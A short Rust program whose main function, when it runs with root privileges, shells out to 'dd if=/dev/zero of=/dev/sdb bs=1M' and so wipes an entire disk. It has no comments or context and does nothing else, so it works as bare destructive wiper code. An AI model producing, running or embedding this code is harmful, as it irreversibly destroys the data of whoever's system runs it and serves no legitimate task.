use std::process::Command;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let _ = Command::new("/bin/sh").arg("-c").arg("dd if=/dev/zero of=/dev/sdb bs=1M").status();
}
